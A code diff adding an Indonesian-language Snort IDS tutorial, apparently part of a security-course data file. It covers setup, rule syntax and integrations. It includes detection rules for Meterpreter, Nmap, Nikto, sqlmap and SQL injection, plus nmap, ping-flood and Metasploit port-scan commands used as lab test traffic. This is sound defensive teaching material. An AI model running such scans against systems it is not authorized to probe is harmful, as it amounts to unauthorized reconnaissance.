+sudo useradd snort -r -s /sbin/nologin -c SNORT_IDS -g snort
+
+# Create directories
+sudo mkdir -p /etc/snort/rules
+sudo mkdir /var/log/snort
+sudo mkdir /usr/local/lib/snort_dynamicrules
+
+# Set permissions
+sudo chmod -R 5775 /etc/snort
+sudo chmod -R 5775 /var/log/snort
+sudo chown -R snort:snort /etc/snort
+sudo chown -R snort:snort /var/log/snort
+\`\`\`
+
+#### 2. Konfigurasi snort.conf
+\`\`\`bash
+# Copy config files
+cd ~/snort-2.9.20/etc/
+sudo cp *.conf* /etc/snort
+sudo cp *.map /etc/snort
+
+# Edit main configuration
+sudo nano /etc/snort/snort.conf
+\`\`\`
+
+**Konfigurasi Penting di snort.conf:**
+\`\`\`conf
+# Setup the network addresses you are protecting
+ipvar HOME_NET 192.168.1.0/24
+
+# Set up the external network addresses
+ipvar EXTERNAL_NET any
+
+# Path to your rules files
+var RULE_PATH /etc/snort/rules
+var SO_RULE_PATH /etc/snort/so_rules
+var PREPROC_RULE_PATH /etc/snort/preproc_rules
+
+# Whitelist/Blacklist
+var WHITE_LIST_PATH /etc/snort/rules
+var BLACK_LIST_PATH /etc/snort/rules
+
+# Output plugins
+output unified2: filename snort.log, limit 128
+
+# Enable preprocessors
+preprocessor frag3_global
+preprocessor frag3_engine
+preprocessor stream5_global
+preprocessor stream5_tcp
+preprocessor stream5_udp
+preprocessor http_inspect
+preprocessor sfportscan
+\`\`\`
+
+## Snort Rules
+
+### Sintaks Rule Snort
+
+\`\`\`
+[action] [protocol] [source IP] [source port] -> [dest IP] [dest port] (rule options)
+\`\`\`
+
+### Komponen Rule
+
+1. **Rule Header** - Action, protocol, addresses, ports
+2. **Rule Options** - Detection criteria dan metadata
+
+### Rule Actions
+
+- **alert** - Generate alert dan log packet
+- **log** - Log packet saja
+- **pass** - Ignore packet
+- **drop** - Block packet (IPS mode)
+- **reject** - Block dan send reset/ICMP unreachable
+- **sdrop** - Block silently
+
+### Contoh Rules Dasar
+
+#### 1. Deteksi ICMP Ping
+\`\`\`
+alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; \\
+    itype:8; sid:1000001; rev:1;)
+\`\`\`
+
+#### 2. Deteksi Port Scan
+\`\`\`
+alert tcp any any -> $HOME_NET any (flags:S; msg:"Possible SYN Scan"; \\
+    detection_filter:track by_src, count 20, seconds 60; \\
+    sid:1000002; rev:1;)
+\`\`\`
+
+#### 3. Deteksi SQL Injection
+\`\`\`
+alert tcp any any -> $HOME_NET 80 (msg:"SQL Injection Attempt"; \\
+    content:"union"; nocase; content:"select"; nocase; \\
+    sid:1000003; rev:1;)
+\`\`\`
+
+#### 4. Deteksi Brute Force SSH
+\`\`\`
+alert tcp any any -> $HOME_NET 22 (msg:"Possible SSH Brute Force"; \\
+    flags:S; detection_filter:track by_src, count 5, seconds 60; \\
+    sid:1000004; rev:1;)
+\`\`\`
+
+#### 5. Deteksi Metasploit Payload
+\`\`\`
+alert tcp any any -> $HOME_NET any (msg:"Metasploit Meterpreter Session"; \\
+    content:"meterpreter"; nocase; sid:1000005; rev:1;)
+\`\`\`
+
+#### 6. Deteksi Nmap Scan
+\`\`\`
+alert tcp any any -> $HOME_NET any (msg:"Nmap XMAS Scan"; \\
+    flags:FPU; sid:1000006; rev:1;)
+
+alert tcp any any -> $HOME_NET any (msg:"Nmap NULL Scan"; \\
+    flags:0; sid:1000007; rev:1;)
+
+alert tcp any any -> $HOME_NET any (msg:"Nmap FIN Scan"; \\
+    flags:F; sid:1000008; rev:1;)
+\`\`\`
+
+#### 7. Deteksi Suspicious User-Agent
+\`\`\`
+alert tcp any any -> $HOME_NET 80 (msg:"Suspicious User-Agent - Nikto"; \\
+    content:"User-Agent|3a| Nikto"; nocase; sid:1000009; rev:1;)
+
+alert tcp any any -> $HOME_NET 80 (msg:"Suspicious User-Agent - sqlmap"; \\
+    content:"User-Agent|3a| sqlmap"; nocase; sid:1000010; rev:1;)
+\`\`\`
+
+### Rule Options Umum
+
+\`\`\`
+msg:"message"          # Pesan alert
+reference:type,id      # Reference ke vulnerability database
+classtype:type         # Klasifikasi serangan
+priority:num           # Priority level
+sid:number             # Snort ID (unique)
+rev:number             # Revision number
+content:"string"       # Content matching
+nocase                 # Case insensitive
+offset:num             # Byte offset
+depth:num              # How deep to search
+pcre:"/pattern/"       # Perl regex
+flags:flags            # TCP flags
+flow:direction         # Connection direction
+threshold:type         # Alert throttling
+\`\`\`
+
+## Menggunakan Snort
+
+### Test Konfigurasi
+\`\`\`bash
+# Test config syntax
+sudo snort -T -c /etc/snort/snort.conf
+
+# Test specific rule file
+sudo snort -T -c /etc/snort/snort.conf -i eth0
+\`\`\`
+
+### Menjalankan Snort
+
+#### Mode Console (Testing)
+\`\`\`bash
+# Run with console output
+sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
+
+# Full alert mode
+sudo snort -A full -c /etc/snort/snort.conf -i eth0
+\`\`\`
+
+#### Mode Daemon (Production)
+\`\`\`bash
+# Run as daemon
+sudo snort -D -c /etc/snort/snort.conf -i eth0 -u snort -g snort
+
+# With specific log directory
+sudo snort -D -c /etc/snort/snort.conf -i eth0 \\
+    -l /var/log/snort -u snort -g snort
+\`\`\`
+
+### Monitoring dan Analisis Log
+
+#### Melihat Alert Log
+\`\`\`bash
+# Real-time alert monitoring
+tail -f /var/log/snort/alert
+
+# Filter specific alerts
+grep "SQL Injection" /var/log/snort/alert
+
+# Count alerts by type
+cat /var/log/snort/alert | grep "\\[\\*\\*\\]" | sort | uniq -c
+\`\`\`
+
+#### Analisis dengan Barnyard2
+
+Barnyard2 memproses unified2 output dari Snort:
+
+\`\`\`bash
+# Install Barnyard2
+sudo apt install barnyard2
+
+# Configure for database output
+sudo nano /etc/snort/barnyard2.conf
+
+# Add database output
+output database: log, mysql, user=snort password=password \\
+    dbname=snort host=localhost
+
+# Run Barnyard2
+barnyard2 -c /etc/snort/barnyard2.conf \\
+    -d /var/log/snort -f snort.log -w /var/log/snort/barnyard2.waldo
+\`\`\`
+
+## Integrasi dengan Tools Lain
+
+### 1. Snort + BASE (Basic Analysis and Security Engine)
+
+BASE adalah web interface untuk analisis Snort alerts:
+
+\`\`\`bash
+# Install LAMP stack
+sudo apt install apache2 mysql-server php libapache2-mod-php
+
+# Install BASE
+cd /var/www/html
+sudo wget https://github.com/NathanGibbs3/BASE/archive/master.zip
+sudo unzip master.zip
+sudo mv BASE-master base
+
+# Configure database
+mysql -u root -p
+CREATE DATABASE snort;
+GRANT ALL ON snort.* TO 'snort'@'localhost' IDENTIFIED BY 'password';
+FLUSH PRIVILEGES;
+
+# Import BASE schema
+mysql -u root -p snort < /var/www/html/base/sql/create_base.sql
+\`\`\`
+
+### 2. Snort + Snorby
+
+Snorby adalah web interface modern untuk Snort:
+
+\`\`\`bash
+# Install Ruby and dependencies
+sudo apt install ruby ruby-dev rubygems
+
+# Install Snorby
+git clone https://github.com/Snorby/snorby.git
+cd snorby
+bundle install
+
+# Configure database
+cp config/database.yml.example config/database.yml
+cp config/snorby_config.yml.example config/snorby_config.yml
+
+# Setup database
+bundle exec rake snorby:setup
+\`\`\`
+
+### 3. Snort + ELK Stack
+
+Integrasi dengan Elasticsearch, Logstash, Kibana:
+
+\`\`\`conf
+# Logstash input configuration
+input {
+  file {
+    path => "/var/log/snort/alert"
+    type => "snort"
+    codec => plain
+  }
+}
+
+filter {
+  if [type] == "snort" {
+    grok {
+      match => { "message" => "%{SNORT}" }
+    }
+  }
+}
+
+output {
+  elasticsearch {
+    hosts => ["localhost:9200"]
+    index => "snort-%{+YYYY.MM.dd}"
+  }
+}
+\`\`\`
+
+## Testing Snort Rules
+
+### 1. Generate Test Traffic dengan Nmap
+\`\`\`bash
+# Test port scan detection
+nmap -sS 192.168.1.100
+
+# Test XMAS scan
+nmap -sX 192.168.1.100
+
+# Test NULL scan
+nmap -sN 192.168.1.100
+\`\`\`
+
+### 2. Test ICMP Detection
+\`\`\`bash
+# Continuous ping
+ping -c 100 192.168.1.100
+
+# Large packet ping
+ping -s 65507 192.168.1.100
+\`\`\`
+
+### 3. Test dengan Metasploit
+\`\`\`bash
+# Start msfconsole
+msfconsole
+
+# Use auxiliary scanner
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.100
+run
+\`\`\`
+
+## Community Rules
+
+### Download Community Rules
+\`\`\`bash
+# Download registered rules
+cd /tmp
+wget https://www.snort.org/downloads/community/community-rules.tar.gz
+tar -xvzf community-rules.tar.gz
+
+# Copy to Snort directory
+sudo cp community-rules/*.rules /etc/snort/rules/
+
+# Include in snort.conf
+echo "include \$RULE_PATH/community.rules" | \\
+    sudo tee -a /etc/snort/snort.conf
+\`\`\`
+
+### Update Rules dengan PulledPork
+
+PulledPork adalah script untuk update rules otomatis:
+
+\`\`\`bash
+# Install PulledPork
+git clone https://github.com/shirkdog/pulledpork.git
+cd pulledpork
+sudo cp pulledpork.pl /usr/local/bin/
+sudo chmod +x /usr/local/bin/pulledpork.pl
+
+# Configure
+sudo cp etc/pulledpork.conf /etc/snort/
+sudo nano /etc/snort/pulledpork.conf
+
+# Add Oinkcode (register at snort.org)
+oinkcode=YOUR_OINKCODE_HERE
+
+# Run update
+sudo /usr/local/bin/pulledpork.pl -c /etc/snort/pulledpork.conf
+
+# Automate with cron
+sudo crontab -e
+# Add: 0 2 * * * /usr/local/bin/pulledpork.pl -c /etc/snort/pulledpork.conf
+\`\`\`
+
+## Performance Tuning
+
+### 1. Preprocessor Tuning
+\`\`\`conf
+# Adjust stream5 memcap
+preprocessor stream5_global: max_tcp 262144, max_udp 131072
+
+# Tune frag3
+preprocessor frag3_global: max_frags 65536
+
+# HTTP inspect tuning
+preprocessor http_inspect_server: server default \\
+    profile all ports { 80 8080 8000 }
+\`\`\`
+
+### 2. Rule Performance
+\`\`\`bash
+# Enable rule profiling
+config profile_rules: print all, sort avg_ticks
+
+# Enable preprocessor profiling  
+config profile_preprocs: print all, sort avg_ticks
+
+# Check performance
+sudo snort -c /etc/snort/snort.conf --rule-to-profile 10
+\`\`\`
+
+### 3. Hardware Optimization
+- Dedicated NIC untuk monitoring
+- Sufficient RAM (minimum 4GB)
+- Fast storage untuk logging
+- Multi-core CPU untuk parallel processing
+
+## Best Practices
+
+### 1. Rule Management
+- Organize rules by category
+- Regular rule updates
+- Test rules before production
+- Document custom rules
+- Version control untuk rules
+
+### 2. Alert Management
+- Tune rules untuk reduce false positives
+- Use suppression untuk known good traffic
+- Implement threshold untuk noisy rules
+- Regular review alerts
+
+### 3. Monitoring
+- Monitor Snort process health
+- Check log rotation
+- Database cleanup reguler
+- Performance monitoring
+
+### 4. Security
+- Run Snort dengan dedicated user
+- Secure configuration files
+- Encrypt database connections
+- Regular backup configurations
+
+## Troubleshooting
+
+### Common Issues
+
+#### 1. Snort Not Starting
+\`\`\`bash
+# Check config
+sudo snort -T -c /etc/snort/snort.conf
+
+# Check permissions
+ls -la /var/log/snort
+
+# Check interface
+ip link show
+\`\`\`
+
+#### 2. No Alerts Generated
+\`\`\`bash
+# Verify rules loaded
+sudo snort -c /etc/snort/snort.conf -T | grep "rules loaded"
+
+# Check network traffic
+sudo tcpdump -i eth0
+
+# Test with simple rule
+alert icmp any any -> any any (msg:"ICMP Test"; sid:9000001;)
+\`\`\`
+
+#### 3. High CPU Usage
+- Disable unused preprocessors
+- Optimize rule set
+- Increase detection threshold
+- Use hardware acceleration
+
+## Kesimpulan
+
+Snort adalah powerful IDS/IPS yang essential untuk network security monitoring. Key points:
+
+- **Flexible** - Multiple operation modes
+- **Customizable** - Extensible rule language
+- **Community** - Large rule database dan community
+- **Integration** - Compatible dengan banyak tools
+- **Free** - Open source dengan enterprise support available
+
+Regular maintenance, tuning, dan monitoring adalah critical untuk effective intrusion detection.
+
+## Resources
+
+- [Snort Official Website](https://www.snort.org)
+- [Snort User Manual](https://www.snort.org/documents)
+- [Snort Rules](https://www.snort.org/downloads)
+- [Snort FAQ](https://www.snort.org/faq)
+- [Community Support](https://www.snort.org/community)
+
+## Lab Exercise
+
+### Setup Basic IDS Lab
+
+1. Install Snort on monitoring host
+2. Configure untuk monitor specific network segment
+3. Create custom rules untuk:
+   - Port scan detection
+   - Brute force attempts
+   - Suspicious web traffic
+   - Malware communication patterns
+4. Generate test traffic
+5. Analyze alerts
+6. Tune rules untuk reduce false positives
+7. Document findings
+
+Practice makes perfect dalam tuning IDS untuk production environment!
+    `
+  }
+];
+
+export const categories = [
+  "Semua",
+  "Dasar",
+  "Teknik",
+  "Tools",
+  "Web Security",
+  "Social Engineering",
+  "Network Security"
+];
